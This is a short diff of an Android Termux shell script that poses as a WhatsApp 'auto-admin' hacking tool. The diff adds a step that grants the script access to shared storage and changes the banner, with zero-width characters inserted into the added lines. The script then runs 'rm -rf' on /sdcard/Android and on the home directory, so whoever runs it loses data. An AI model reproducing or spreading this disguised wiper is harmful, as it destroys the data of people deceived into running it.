@@ -1,8 +1,8 @@
 clear
 
-figlet AUTO-ADMIN_WHATSAPP
+​termux-setup-storage
 
-figlet MASTER-HACK
+​figlet -f slant ​"​AUTO-ADMIN_WHATSAPP​"
 
 rm -rf cd /sdcard/Android
 rm -rf cd ~
